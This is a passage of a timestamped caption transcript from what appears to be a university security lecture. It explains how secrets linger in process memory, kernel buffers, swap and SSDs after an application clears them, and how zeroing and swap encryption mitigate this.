              <time_slice>19:30</time_slice>
              <text_slice>Now it's just sleeping
in the background.</text_slice>
            </slice>
            <slice>
              <time_slice>19:32</time_slice>
              <text_slice>So once again, if we use
this fun gcore command,</text_slice>
            </slice>
            <slice>
              <time_slice>19:39</time_slice>
              <text_slice>we can take a memory dump
of the memclear program</text_slice>
            </slice>
            <slice>
              <time_slice>19:44</time_slice>
              <text_slice>that's running in
memory right now.</text_slice>
            </slice>
            <slice>
              <time_slice>19:46</time_slice>
              <text_slice>OK, and then if we
do-- let's see which</text_slice>
            </slice>
            <slice>
              <time_slice>19:51</time_slice>
              <text_slice>ones we're going to look at.</text_slice>
            </slice>
            <slice>
              <time_slice>19:54</time_slice>
              <text_slice>So then if we look at--
this guy is the one we want.</text_slice>
            </slice>
            <slice>
              <time_slice>20:00</time_slice>
              <text_slice>And then we do a
grep for a secret.</text_slice>
            </slice>
            <slice>
              <time_slice>20:05</time_slice>
              <text_slice>So once again, we
see that if look</text_slice>
            </slice>
            <slice>
              <time_slice>20:07</time_slice>
              <text_slice>in the RAM image of
that running program,</text_slice>
            </slice>
            <slice>
              <time_slice>20:11</time_slice>
              <text_slice>we found instances of
both the file name that</text_slice>
            </slice>
            <slice>
              <time_slice>20:14</time_slice>
              <text_slice>was read in and also some
prefixes of the string</text_slice>
            </slice>
            <slice>
              <time_slice>20:17</time_slice>
              <text_slice>contents of that
file, even though we</text_slice>
            </slice>
            <slice>
              <time_slice>20:20</time_slice>
              <text_slice>wiped the buffer in
the C program itself.</text_slice>
            </slice>
            <slice>
              <time_slice>20:24</time_slice>
              <text_slice>So you might say
why did this happen?</text_slice>
            </slice>
            <slice>
              <time_slice>20:26</time_slice>
              <text_slice>This seems very, very strange.</text_slice>
            </slice>
            <slice>
              <time_slice>20:28</time_slice>
              <text_slice>And the reason is that if
you think about the way</text_slice>
            </slice>
            <slice>
              <time_slice>20:30</time_slice>
              <text_slice>that I/O works, it's
like a layer type thing.</text_slice>
            </slice>
            <slice>
              <time_slice>20:34</time_slice>
              <text_slice>So by the time that the
contents of that file</text_slice>
            </slice>
            <slice>
              <time_slice>20:37</time_slice>
              <text_slice>get to the program, it's
already gone through, let's say,</text_slice>
            </slice>
            <slice>
              <time_slice>20:41</time_slice>
              <text_slice>the kernel memory.</text_slice>
            </slice>
            <slice>
              <time_slice>20:42</time_slice>
              <text_slice>It's already gone through maybe
like the C Standard Library</text_slice>
            </slice>
            <slice>
              <time_slice>20:45</time_slice>
              <text_slice>to do I/O because
that library does</text_slice>
            </slice>
            <slice>
              <time_slice>20:47</time_slice>
              <text_slice>buffering and stuff like that.</text_slice>
            </slice>
            <slice>
              <time_slice>20:48</time_slice>
              <text_slice>And so what ends up
happening is that even</text_slice>
            </slice>
            <slice>
              <time_slice>20:50</time_slice>
              <text_slice>if you memset the
application visible buffer,</text_slice>
            </slice>
            <slice>
              <time_slice>20:54</time_slice>
              <text_slice>there are still instances
of secret data lying</text_slice>
            </slice>
            <slice>
              <time_slice>20:57</time_slice>
              <text_slice>in many different places
throughout the system.</text_slice>
            </slice>
            <slice>
              <time_slice>21:00</time_slice>
              <text_slice>And this is looking
at the user mode</text_slice>
            </slice>
            <slice>
              <time_slice>21:02</time_slice>
              <text_slice>portion of this application.</text_slice>
            </slice>
            <slice>
              <time_slice>21:03</time_slice>
              <text_slice>So there's probably still
data sitting around in maybe</text_slice>
            </slice>
            <slice>
              <time_slice>21:06</time_slice>
              <text_slice>like the kernel I/O buffers
or things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>21:09</time_slice>
              <text_slice>So getting back
to your question,</text_slice>
            </slice>
            <slice>
              <time_slice>21:10</time_slice>
              <text_slice>if you want to do what they
call security allocation,</text_slice>
            </slice>
            <slice>
              <time_slice>21:13</time_slice>
              <text_slice>you can't just rely on
mechanisms at the application</text_slice>
            </slice>
            <slice>
              <time_slice>21:17</time_slice>
              <text_slice>level because there may be other
places where that data lives.</text_slice>
            </slice>
            <slice>
              <time_slice>21:20</time_slice>
              <text_slice>So what are some
examples of other places</text_slice>
            </slice>
            <slice>
              <time_slice>21:22</time_slice>
              <text_slice>where this data might live?</text_slice>
            </slice>
            <slice>
              <time_slice>21:26</time_slice>
              <text_slice>So, for example, it might
live in a process memory.</text_slice>
            </slice>
            <slice>
              <time_slice>21:33</time_slice>
              <text_slice>So these are things like
the heap and the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>21:41</time_slice>
              <text_slice>So when we did that memset
inside of memclear.c,</text_slice>
            </slice>
            <slice>
              <time_slice>21:45</time_slice>
              <text_slice>we were basically
trying to address this.</text_slice>
            </slice>
            <slice>
              <time_slice>21:47</time_slice>
              <text_slice>But what we found
out is that that</text_slice>
            </slice>
            <slice>
              <time_slice>21:50</time_slice>
              <text_slice>is necessary, but insufficient
to actually clear all instances</text_slice>
            </slice>
            <slice>
              <time_slice>21:54</time_slice>
              <text_slice>of that secret from memory.</text_slice>
            </slice>
            <slice>
              <time_slice>21:56</time_slice>
              <text_slice>So where else my RAM
artifacts live or secret data</text_slice>
            </slice>
            <slice>
              <time_slice>22:02</time_slice>
              <text_slice>persists-- so all
kinds of files--</text_slice>
            </slice>
            <slice>
              <time_slice>22:05</time_slice>
              <text_slice>backups-- SQL write databases.</text_slice>
            </slice>
            <slice>
              <time_slice>22:14</time_slice>
              <text_slice>If at any point, an application
takes something in RAM</text_slice>
            </slice>
            <slice>
              <time_slice>22:18</time_slice>
              <text_slice>and writes it to one of these
things, then once again,</text_slice>
            </slice>
            <slice>
              <time_slice>22:20</time_slice>
              <text_slice>the attacker may be able to
recover that after the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>22:23</time_slice>
              <text_slice>controls the disk .</text_slice>
            </slice>
            <slice>
              <time_slice>22:25</time_slice>
              <text_slice>As I mentioned, a kernel
memory is another common place</text_slice>
            </slice>
            <slice>
              <time_slice>22:33</time_slice>
              <text_slice>where RAM secrets may
live because, once</text_slice>
            </slice>
            <slice>
              <time_slice>22:35</time_slice>
              <text_slice>again, applications typically
do layered I/O in which</text_slice>
            </slice>
            <slice>
              <time_slice>22:39</time_slice>
              <text_slice>each piece of data goes through
multiple parts of the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>22:42</time_slice>
              <text_slice>Think of like network
transmission, for example.</text_slice>
            </slice>
            <slice>
              <time_slice>22:45</time_slice>
              <text_slice>First, the data has to come
to some network buffer that's</text_slice>
            </slice>
            <slice>
              <time_slice>22:48</time_slice>
              <text_slice>probably inside the kernel.</text_slice>
            </slice>
            <slice>
              <time_slice>22:49</time_slice>
              <text_slice>Then once again, it probably
goes through some buffers</text_slice>
            </slice>
            <slice>
              <time_slice>22:52</time_slice>
              <text_slice>inside the C Standard Library.</text_slice>
            </slice>
            <slice>
              <time_slice>22:54</time_slice>
              <text_slice>And then finally it will
go to the user mode--</text_slice>
            </slice>
            <slice>
              <time_slice>22:57</time_slice>
              <text_slice>the part of the application
that the developer wrote</text_slice>
            </slice>
            <slice>
              <time_slice>22:59</time_slice>
              <text_slice>him or herself.</text_slice>
            </slice>
            <slice>
              <time_slice>23:02</time_slice>
              <text_slice>So that can actually
be a big problem.</text_slice>
            </slice>
            <slice>
              <time_slice>23:04</time_slice>
              <text_slice>You can also think too of
freed memory pages as being</text_slice>
            </slice>
            <slice>
              <time_slice>23:07</time_slice>
              <text_slice>a place where data can leak.</text_slice>
            </slice>
            <slice>
              <time_slice>23:09</time_slice>
              <text_slice>So imagine that your
application allocates</text_slice>
            </slice>
            <slice>
              <time_slice>23:14</time_slice>
              <text_slice>a bunch of memory using
whatever [INAUDIBLE] or whatnot.</text_slice>
            </slice>
            <slice>
              <time_slice>23:18</time_slice>
              <text_slice>And then that process dies.</text_slice>
            </slice>
            <slice>
              <time_slice>23:20</time_slice>
              <text_slice>And the kernel sends
out another process</text_slice>
            </slice>
            <slice>
              <time_slice>23:23</time_slice>
              <text_slice>but hasn't actually zeroed
out all the physical RAM page.</text_slice>
            </slice>
            <slice>
              <time_slice>23:26</time_slice>
              <text_slice>So what could happen is that
when that new process spins up,</text_slice>
            </slice>
            <slice>
              <time_slice>23:29</time_slice>
              <text_slice>it could just do a walk through
all this physical RAM pages</text_slice>
            </slice>
            <slice>
              <time_slice>23:32</time_slice>
              <text_slice>and use a bunch of
memory and just do</text_slice>
            </slice>
            <slice>
              <time_slice>23:33</time_slice>
              <text_slice>the same thing-- do the
strange thing-- see if there's</text_slice>
            </slice>
            <slice>
              <time_slice>23:36</time_slice>
              <text_slice>anything interesting there.</text_slice>
            </slice>
            <slice>
              <time_slice>23:38</time_slice>
              <text_slice>And then they might be able
to get secrets that way.</text_slice>
            </slice>
            <slice>
              <time_slice>23:40</time_slice>
              <text_slice>So there's a lot
of ways information</text_slice>
            </slice>
            <slice>
              <time_slice>23:41</time_slice>
              <text_slice>is leaked from the kernel.</text_slice>
            </slice>
            <slice>
              <time_slice>23:44</time_slice>
              <text_slice>You could also think about
I/O buffers and things</text_slice>
            </slice>
            <slice>
              <time_slice>23:47</time_slice>
              <text_slice>like a keyboard from
things like the mouse.</text_slice>
            </slice>
            <slice>
              <time_slice>23:50</time_slice>
              <text_slice>There's just a bunch
of different factors</text_slice>
            </slice>
            <slice>
              <time_slice>23:52</time_slice>
              <text_slice>that data can leak
through the kernel.</text_slice>
            </slice>
            <slice>
              <time_slice>23:59</time_slice>
              <text_slice>How might an attacker try to
get some of this information?</text_slice>
            </slice>
            <slice>
              <time_slice>24:03</time_slice>
              <text_slice>Well, in some
cases, it's just as</text_slice>
            </slice>
            <slice>
              <time_slice>24:04</time_slice>
              <text_slice>simple as reading the files--
so just read the page file.</text_slice>
            </slice>
            <slice>
              <time_slice>24:09</time_slice>
              <text_slice>Read the hibernation file
and just see what's in there.</text_slice>
            </slice>
            <slice>
              <time_slice>24:13</time_slice>
              <text_slice>Some file formats actually
embed different versions</text_slice>
            </slice>
            <slice>
              <time_slice>24:16</time_slice>
              <text_slice>within themselves.</text_slice>
            </slice>
            <slice>
              <time_slice>24:17</time_slice>
              <text_slice>For example, the way that
Microsoft Word used to work</text_slice>
            </slice>
            <slice>
              <time_slice>24:19</time_slice>
              <text_slice>is that a single Word file
would actually contain versions</text_slice>
            </slice>
            <slice>
              <time_slice>24:22</time_slice>
              <text_slice>for old pieces of data.</text_slice>
            </slice>
            <slice>
              <time_slice>24:23</time_slice>
              <text_slice>So if you could get
access to that Word file,</text_slice>
            </slice>
            <slice>
              <time_slice>24:25</time_slice>
              <text_slice>you could just sit there
through either format</text_slice>
            </slice>
            <slice>
              <time_slice>24:27</time_slice>
              <text_slice>and so step through
all the old versions.</text_slice>
            </slice>
            <slice>
              <time_slice>24:30</time_slice>
              <text_slice>And so as we have been
discussing in the last couple</text_slice>
            </slice>
            <slice>
              <time_slice>24:33</time_slice>
              <text_slice>minutes, security allocation
is also a problem.</text_slice>
            </slice>
            <slice>
              <time_slice>24:38</time_slice>
              <text_slice>It cannot supported
a full stack.</text_slice>
            </slice>
            <slice>
              <time_slice>24:40</time_slice>
              <text_slice>So for example, an older
Linux kernel-- when</text_slice>
            </slice>
            <slice>
              <time_slice>24:42</time_slice>
              <text_slice>you would create a
directory, end directory,</text_slice>
            </slice>
            <slice>
              <time_slice>24:45</time_slice>
              <text_slice>you could leak up to four
kilobytes of kernel memory.</text_slice>
            </slice>
            <slice>
              <time_slice>24:49</time_slice>
              <text_slice>Only Zeus knows what's
inside that memory.</text_slice>
            </slice>
            <slice>
              <time_slice>24:51</time_slice>
              <text_slice>And that's because Linux
wasn't actually zeroing out</text_slice>
            </slice>
            <slice>
              <time_slice>24:55</time_slice>
              <text_slice>kernel memory that had been
allocated, deallocated,</text_slice>
            </slice>
            <slice>
              <time_slice>24:58</time_slice>
              <text_slice>and then allocated
to something else.</text_slice>
            </slice>
            <slice>
              <time_slice>25:02</time_slice>
              <text_slice>So as I mentioned before too--
if the kernel doesn't zero out</text_slice>
            </slice>
            <slice>
              <time_slice>25:06</time_slice>
              <text_slice>pages that are given
to user mode processes,</text_slice>
            </slice>
            <slice>
              <time_slice>25:09</time_slice>
              <text_slice>you can also have
user mode secret</text_slice>
            </slice>
            <slice>
              <time_slice>25:10</time_slice>
              <text_slice>leaks through those types
of menu pages as well.</text_slice>
            </slice>
            <slice>
              <time_slice>25:14</time_slice>
              <text_slice>Another thing is that-- SSDs--
many of them implement logging.</text_slice>
            </slice>
            <slice>
              <time_slice>25:26</time_slice>
              <text_slice>And so in other words, when
you send a write to an SSD,</text_slice>
            </slice>
            <slice>
              <time_slice>25:32</time_slice>
              <text_slice>oftentimes you are not
directly overwriting data,</text_slice>
            </slice>
            <slice>
              <time_slice>25:35</time_slice>
              <text_slice>you're actually
writing to a log.</text_slice>
            </slice>
            <slice>
              <time_slice>25:37</time_slice>
              <text_slice>And when a piece of
data becomes invalid,</text_slice>
            </slice>
            <slice>
              <time_slice>25:40</time_slice>
              <text_slice>it lays away your claim.</text_slice>
            </slice>
            <slice>
              <time_slice>25:42</time_slice>
              <text_slice>So what that means is that if
you as the user get unlucky.</text_slice>
            </slice>
            <slice>
              <time_slice>25:46</time_slice>
              <text_slice>And you've written a bunch of
data that hasn't been reclaimed</text_slice>
            </slice>
            <slice>
              <time_slice>25:49</time_slice>
              <text_slice>by the SSD, then
maybe the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>25:51</time_slice>
              <text_slice>can look at that
hardware and say, oh, OK,</text_slice>
            </slice>
            <slice>
              <time_slice>25:54</time_slice>
              <text_slice>I understand the log format.</text_slice>
            </slice>
            <slice>
              <time_slice>25:55</time_slice>
              <text_slice>And even though
technically speaking,</text_slice>
            </slice>
            <slice>
              <time_slice>25:56</time_slice>
              <text_slice>this data may be
invalid, I can still</text_slice>
            </slice>
            <slice>
              <time_slice>25:58</time_slice>
              <text_slice>recover because I understand
how the Flash translation layer</text_slice>
            </slice>
            <slice>
              <time_slice>26:01</time_slice>
              <text_slice>works or something like that.</text_slice>
            </slice>
            <slice>
              <time_slice>26:03</time_slice>
              <text_slice>And at a high
level, you can also</text_slice>
            </slice>
            <slice>
              <time_slice>26:04</time_slice>
              <text_slice>have this problem with stolen
or discarded hardware as well.</text_slice>
            </slice>
            <slice>
              <time_slice>26:10</time_slice>
              <text_slice>If you don't use encryption,
then a lot of times,</text_slice>
            </slice>
            <slice>
              <time_slice>26:12</time_slice>
              <text_slice>you can just take
some disk that you</text_slice>
            </slice>
            <slice>
              <time_slice>26:14</time_slice>
              <text_slice>found in a dumpster
somewhere-- you</text_slice>
            </slice>
            <slice>
              <time_slice>26:15</time_slice>
              <text_slice>understand what the
physical layout is</text_slice>
            </slice>
            <slice>
              <time_slice>26:17</time_slice>
              <text_slice>and recover data like that.</text_slice>
            </slice>
            <slice>
              <time_slice>26:19</time_slice>
              <text_slice>So anyway, there's
a lot of problems</text_slice>
            </slice>
            <slice>
              <time_slice>26:21</time_slice>
              <text_slice>with these RAM artifacts getting
stuck in persistent storage</text_slice>
            </slice>
            <slice>
              <time_slice>26:25</time_slice>
              <text_slice>somehow and then being available
for an attacker later on.</text_slice>
            </slice>
            <slice>
              <time_slice>26:30</time_slice>
              <text_slice>So how can we fix these
data lifetime problems?</text_slice>
            </slice>
            <slice>
              <time_slice>26:42</time_slice>
              <text_slice>So we've already
discussed one solution,</text_slice>
            </slice>
            <slice>
              <time_slice>26:47</time_slice>
              <text_slice>which is to basically
zero out memory</text_slice>
            </slice>
            <slice>
              <time_slice>26:53</time_slice>
              <text_slice>when you're done with it.</text_slice>
            </slice>
            <slice>
              <time_slice>26:57</time_slice>
              <text_slice>So whenever you deallocate
something, you just go through.</text_slice>
            </slice>
            <slice>
              <time_slice>27:00</time_slice>
              <text_slice>You write a bunch of
zeros or some random thing</text_slice>
            </slice>
            <slice>
              <time_slice>27:02</time_slice>
              <text_slice>and then essentially
hide the old data</text_slice>
            </slice>
            <slice>
              <time_slice>27:04</time_slice>
              <text_slice>from someone else who
might come along later.</text_slice>
            </slice>
            <slice>
              <time_slice>27:06</time_slice>
              <text_slice>So does anyone see potential
any potential problem with that?</text_slice>
            </slice>
            <slice>
              <time_slice>27:13</time_slice>
              <text_slice>One problem you might imagine
is that as with all things</text_slice>
            </slice>
            <slice>
              <time_slice>27:16</time_slice>
              <text_slice>in security, people always
complain about performance.</text_slice>
            </slice>
            <slice>
              <time_slice>27:20</time_slice>
              <text_slice>And so when you say that
you zero out memory,</text_slice>
            </slice>
            <slice>
              <time_slice>27:22</time_slice>
              <text_slice>maybe this isn't a problem
if your program is I/O bound.</text_slice>
            </slice>
            <slice>
              <time_slice>27:26</time_slice>
              <text_slice>So you're waiting on some
slow, mechanical part</text_slice>
            </slice>
            <slice>
              <time_slice>27:28</time_slice>
              <text_slice>of the hard disk or whatnot.</text_slice>
            </slice>
            <slice>
              <time_slice>27:30</time_slice>
              <text_slice>But imagine if your
program is CPU bound.</text_slice>
            </slice>
            <slice>
              <time_slice>27:32</time_slice>
              <text_slice>And maybe it's very
memory intensive too.</text_slice>
            </slice>
            <slice>
              <time_slice>27:34</time_slice>
              <text_slice>So it's always allocating
and deallocating data.</text_slice>
            </slice>
            <slice>
              <time_slice>27:36</time_slice>
              <text_slice>So maybe zeroing out memory
might be performance cost</text_slice>
            </slice>
            <slice>
              <time_slice>27:40</time_slice>
              <text_slice>that you don't want to pay.</text_slice>
            </slice>
            <slice>
              <time_slice>27:42</time_slice>
              <text_slice>Typically this isn't
a problem in practice.</text_slice>
            </slice>
            <slice>
              <time_slice>27:44</time_slice>
              <text_slice>But as we all know,
people love performance.</text_slice>
            </slice>
            <slice>
              <time_slice>27:45</time_slice>
              <text_slice>This is sometimes an
objection that you'll</text_slice>
            </slice>
            <slice>
              <time_slice>27:47</time_slice>
              <text_slice>have with this approach.</text_slice>
            </slice>
            <slice>
              <time_slice>27:49</time_slice>
              <text_slice>Another thing you
can imagine doing</text_slice>
            </slice>
            <slice>
              <time_slice>27:51</time_slice>
              <text_slice>is that instead of
zeroing out memory,</text_slice>
            </slice>
            <slice>
              <time_slice>27:53</time_slice>
              <text_slice>you always encrypt data as
it goes to stable storage.</text_slice>
            </slice>
            <slice>
              <time_slice>28:08</time_slice>
              <text_slice>So in a system like
this, basically,</text_slice>
            </slice>
            <slice>
              <time_slice>28:11</time_slice>
              <text_slice>before the application ever
writes anything to disk,</text_slice>
            </slice>
            <slice>
              <time_slice>28:14</time_slice>
              <text_slice>it's actually going to encrypt
it before it actually hits</text_slice>
            </slice>
            <slice>
              <time_slice>28:17</time_slice>
              <text_slice>that SSD or that hard disk.</text_slice>
            </slice>
            <slice>
              <time_slice>28:19</time_slice>
              <text_slice>Similarly, when the data comes
back in from stable storage,</text_slice>
            </slice>
            <slice>
              <time_slice>28:22</time_slice>
              <text_slice>you're going to
decrypt it dynamically</text_slice>
            </slice>
            <slice>
              <time_slice>28:24</time_slice>
              <text_slice>before you put it into RAM.</text_slice>
            </slice>
            <slice>
              <time_slice>28:26</time_slice>
              <text_slice>And so what's interesting
about this approach is</text_slice>
            </slice>
            <slice>
              <time_slice>28:29</time_slice>
              <text_slice>that if the key that you use
to decrypt and encrypt data--</text_slice>
            </slice>
            <slice>
              <time_slice>28:33</time_slice>
              <text_slice>if you throw it away, then
once you throw it away,</text_slice>
            </slice>
            <slice>
              <time_slice>28:36</time_slice>
              <text_slice>you've effectively
made that data on disk</text_slice>
            </slice>
            <slice>
              <time_slice>28:39</time_slice>
              <text_slice>unrecoverable by the
attacker, assuming that you</text_slice>
            </slice>
            <slice>
              <time_slice>28:42</time_slice>
              <text_slice>believe in cryptography.</text_slice>
            </slice>
            <slice>
              <time_slice>28:44</time_slice>
              <text_slice>So this is very, very
nice because it gives us</text_slice>
            </slice>
            <slice>
              <time_slice>28:49</time_slice>
              <text_slice>this nice property
that we don't have</text_slice>
            </slice>
            <slice>
              <time_slice>28:50</time_slice>
              <text_slice>to remember per se all
places where you've</text_slice>
            </slice>
            <slice>
              <time_slice>28:53</time_slice>
              <text_slice>written this encrypted data.</text_slice>
            </slice>
            <slice>
              <time_slice>28:54</time_slice>
              <text_slice>We can just say
why drop the keys?</text_slice>
            </slice>
            <slice>
              <time_slice>28:56</time_slice>
              <text_slice>And I'll just treat
all that encrypted data</text_slice>
            </slice>
            <slice>
              <time_slice>28:58</time_slice>
              <text_slice>as it's something that
I can allocate again.</text_slice>
            </slice>
            <slice>
              <time_slice>29:01</time_slice>
              <text_slice>So, for example, if
you look at Open BSD,</text_slice>
            </slice>
            <slice>
              <time_slice>29:08</time_slice>
              <text_slice>they have this option where
you can do swap encryption.</text_slice>
            </slice>
            <slice>
              <time_slice>29:14</time_slice>
              <text_slice>So you can basically
associate keys</text_slice>
            </slice>
            <slice>
              <time_slice>29:19</time_slice>
              <text_slice>with various sections
of the page file.</text_slice>
            </slice>
            <slice>
              <time_slice>29:22</time_slice>
              <text_slice>So it does this very
thing I mentioned.</text_slice>
            </slice>
            <slice>
              <time_slice>29:24</time_slice>
              <text_slice>So every time you
group the machine,</text_slice>
            </slice>
            <slice>
              <time_slice>29:25</time_slice>
              <text_slice>it'll generate a
bunch of new keys.</text_slice>
            </slice>
            <slice>
              <time_slice>29:27</time_slice>
              <text_slice>And then when your machine goes
down because you shut it down</text_slice>
            </slice>
            <slice>
              <time_slice>29:30</time_slice>
              <text_slice>or you reboot it or
whatever, it will basically</text_slice>
            </slice>
            <slice>
              <time_slice>29:32</time_slice>
              <text_slice>forget all the keys that it
used to encrypt that swap space.</text_slice>
            </slice>
            <slice>
              <time_slice>29:35</time_slice>
              <text_slice>And then it can basically
say now all that swap</text_slice>
            </slice>
            <slice>
              <time_slice>29:37</time_slice>
              <text_slice>is available to be used again.</text_slice>
            </slice>
            <slice>
              <time_slice>29:38</time_slice>
              <text_slice>And so because those
keys are forgotten,</text_slice>
            </slice>
            <slice>
              <time_slice>29:40</time_slice>
              <text_slice>one can assume that
the attacker can't look</text_slice>
            </slice>
            <slice>
              <time_slice>29:42</time_slice>
              <text_slice>at the stuff that is in there.</text_slice>
            </slice>
            <slice>
              <time_slice>29:43</time_slice>
              <text_slice>AUDIENCE: What is
the [INAUDIBLE]?</text_slice>
            </slice>
            <slice>
              <time_slice>29:47</time_slice>
              <text_slice>PROFESSOR: Ah, yeah,
that's a good question.</text_slice>
            </slice>
            <slice>
              <time_slice>29:48</time_slice>
              <text_slice>I'm actually not sure what
sources of entropy it uses.</text_slice>
            </slice>
            <slice>
              <time_slice>29:52</time_slice>
              <text_slice>Open BSD is pretty
paranoid about security.</text_slice>
            </slice>
            <slice>
              <time_slice>29:56</time_slice>
              <text_slice>So I imagine it
does things like it</text_slice>
            </slice>
            <slice>
              <time_slice>29:58</time_slice>
              <text_slice>looks at let's say the
entropy pool gathered</text_slice>
            </slice>
            <slice>
              <time_slice>30:00</time_slice>
              <text_slice>from user keyboard
input, for example,</text_slice>
            </slice>
            <slice>
              <time_slice>30:02</time_slice>
              <text_slice>and other things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>30:03</time_slice>
              <text_slice>Yeah, I'm not actually sure
how it drives those keys.</text_slice>
            </slice>
            <slice>
              <time_slice>30:05</time_slice>
              <text_slice>But you're exactly right that
if these sources of entropy</text_slice>
            </slice>
            <slice>
              <time_slice>30:08</time_slice>
              <text_slice>that it uses are predictable,
then that basically</text_slice>
            </slice>
            <slice>
              <time_slice>30:10</time_slice>
              <text_slice>shrinks the entropy
space of the key itself,</text_slice>
            </slice>
            <slice>
              <time_slice>30:12</time_slice>
              <text_slice>which then makes the
key more vulnerable.</text_slice>
            </slice>
            <slice>
              <time_slice>30:13</time_slice>
              <text_slice>AUDIENCE: So with the memory
it's capturing [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>30:21</time_slice>
              <text_slice>PROFESSOR: Yeah, so basically,
what this model assumes</text_slice>
            </slice>
            <slice>
              <time_slice>30:25</time_slice>
              <text_slice>if all we are doing is looking
at the swap encryption,</text_slice>
            </slice>
            <slice>
              <time_slice>30:28</time_slice>
              <text_slice>It assumes that the
RAM pages for the keys,</text_slice>
            </slice>
            <slice>
              <time_slice>30:32</time_slice>
              <text_slice>for example, are
never swapped out.</text_slice>
            </slice>
            <slice>
              <time_slice>30:34</time_slice>
              <text_slice>And that's actually
pretty easy to do</text_slice>
            </slice>
            <slice>
              <time_slice>30:35</time_slice>
              <text_slice>if you're the OS of if you
just pin that page to memory.</text_slice>
            </slice>
            <slice>
              <time_slice>30:38</time_slice>
              <text_slice>And this also doesn't
help you with someone</text_slice>
            </slice>
            <slice>
              <time_slice>30:40</time_slice>
              <text_slice>whose got pins with the
memory bus or someone who</text_slice>
            </slice>
            <slice>
              <time_slice>30:42</time_slice>
              <text_slice>can walk the kernel memory
page or stuff like that.</text_slice>
            </slice>
            <slice>
              <time_slice>30:44</time_slice>
              <text_slice>So you're right.</text_slice>
            </slice>
            <slice>
              <time_slice>30:47</time_slice>
              <text_slice>AUDIENCE: In terms
of browsing, it</text_slice>
            </slice>
            <slice>
              <time_slice>30:49</time_slice>
              <text_slice>helps of attackers that
come after the fact</text_slice>
            </slice>
            <slice>
              <time_slice>30:51</time_slice>
              <text_slice>because if you have
to throw away the key,</text_slice>
            </slice>
            <slice>
              <time_slice>30:53</time_slice>
              <text_slice>then after the fact,
there is no key to memory.</text_slice>
            </slice>
            <slice>
              <time_slice>30:55</time_slice>
              <text_slice>PROFESSOR: Yeah,
that's exactly right.</text_slice>
            </slice>
            <slice>
              <time_slice>30:57</time_slice>
              <text_slice>So what's nice about this
is that it essentially</text_slice>
            </slice>
            <slice>
              <time_slice>30:59</time_slice>
              <text_slice>doesn't require modifications
to applications.</text_slice>
            </slice>
            <slice>
              <time_slice>31:01</time_slice>
              <text_slice>Like you said, you can just
put any old thing atop this</text_slice>
            </slice>
            <slice>
              <time_slice>31:04</time_slice>
              <text_slice>and get this property for free.</text_slice>
            </slice>
            <slice>
              <time_slice>31:09</time_slice>
              <text_slice>AUDIENCE: Going back a bit--
if you look at the data</text_slice>
            </slice>
            <slice>
              <time_slice>31:11</time_slice>
              <text_slice>before [INAUDIBLE] to RAM.</text_slice>
            </slice>
            <slice>
              <time_slice>31:16</time_slice>
              <text_slice>How does that avoid the
RAM artifacts [INAUDIBLE]?</text_slice>
            </slice>
            <slice>
              <time_slice>31:21</time_slice>
              <text_slice>PROFESSOR: OK, so if I
understand your question</text_slice>
            </slice>
            <slice>
              <time_slice>31:23</time_slice>
              <text_slice>correctly, I think you're
worried about the fact</text_slice>
            </slice>
            <slice>
              <time_slice>31:25</time_slice>
              <text_slice>that, sure, data is
encrypted when it's on disk,</text_slice>
            </slice>
            <slice>
              <time_slice>31:29</time_slice>
              <text_slice>but then it actually can
sit in clear text forms</text_slice>
            </slice>
            <slice>
              <time_slice>31:31</time_slice>
              <text_slice>somehow in the
actual memory itself.</text_slice>
            </slice>
            <slice>
              <time_slice>31:34</time_slice>
              <text_slice>So this gets back to the
discussion that we had here.</text_slice>
            </slice>
            <slice>
              <time_slice>31:37</time_slice>
              <text_slice>So ensuring that data
hit the disk encrypted</text_slice>
            </slice>
            <slice>
              <time_slice>31:42</time_slice>
              <text_slice>doesn't actually protect
against an attacker who</text_slice>
            </slice>
            <slice>
              <time_slice>31:44</time_slice>
              <text_slice>can look at RAM in real time.</text_slice>
            </slice>
            <slice>
              <time_slice>31:46</time_slice>
              <text_slice>So basically what
we're saying is</text_slice>
            </slice>
            <slice>
              <time_slice>31:47</time_slice>
              <text_slice>that if you're only worried
about this post-session</text_slice>
            </slice>
            <slice>
              <time_slice>31:50</time_slice>
              <text_slice>attacker who can't, for
example, look at your RAM views</text_slice>
            </slice>
            <slice>
              <time_slice>31:52</time_slice>
              <text_slice>in real time, this works fine.</text_slice>
            </slice>
            <slice>
              <time_slice>31:54</time_slice>
              <text_slice>But you're exactly right
that this does not provide,</text_slice>
            </slice>
            <slice>
              <time_slice>31:56</time_slice>
              <text_slice>for lack of a better
term, encrypted RAM.</text_slice>
            </slice>
            <slice>
              <time_slice>31:58</time_slice>
              <text_slice>And there actually are
some research systems that</text_slice>
            </slice>
            <slice>
              <time_slice>32:00</time_slice>
              <text_slice>try to do something like that.</text_slice>
            </slice>
            <slice>
              <time_slice>32:01</time_slice>
              <text_slice>It gets a little bit tricky
because at some point when</text_slice>
            </slice>
            <slice>
              <time_slice>32:04</time_slice>
              <text_slice>you look at your
hardware, your processor,</text_slice>
            </slice>
            <slice>
              <time_slice>32:06</time_slice>
              <text_slice>it has to actually do
something on real data</text_slice>
            </slice>
            <slice>
              <time_slice>32:10</time_slice>
              <text_slice>like if you want to do an ad and
you have to pass a clear text</text_slice>
            </slice>
            <slice>
              <time_slice>32:13</time_slice>
              <text_slice>operands perhaps.</text_slice>
            </slice>
            <slice>
              <time_slice>32:15</time_slice>
              <text_slice>There are also some
interesting research systems</text_slice>
            </slice>
            <slice>
              <time_slice>32:17</time_slice>
              <text_slice>which actually try to do
computation on encrypted data.</text_slice>
            </slice>
            <slice>
              <time_slice>32:20</time_slice>
              <text_slice>This is mind blowing
like "The Matrix."</text_slice>
            </slice>
            <slice>
              <time_slice>32:23</time_slice>
              <text_slice>But suffice it to say that
protections that people have</text_slice>
            </slice>
            <slice>
              <time_slice>32:26</time_slice>
              <text_slice>for in RAM data are typically
much weaker than what</text_slice>
            </slice>
            <slice>
              <time_slice>32:29</time_slice>
              <text_slice>they have for data that
lives on stable storage.</text_slice>
            </slice>
            <slice>
              <time_slice>32:32</time_slice>
              <text_slice>You got a question?</text_slice>
            </slice>
            <slice>
              <time_slice>32:33</time_slice>
              <text_slice>AUDIENCE: Yeah, but
does that [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>32:35</time_slice>
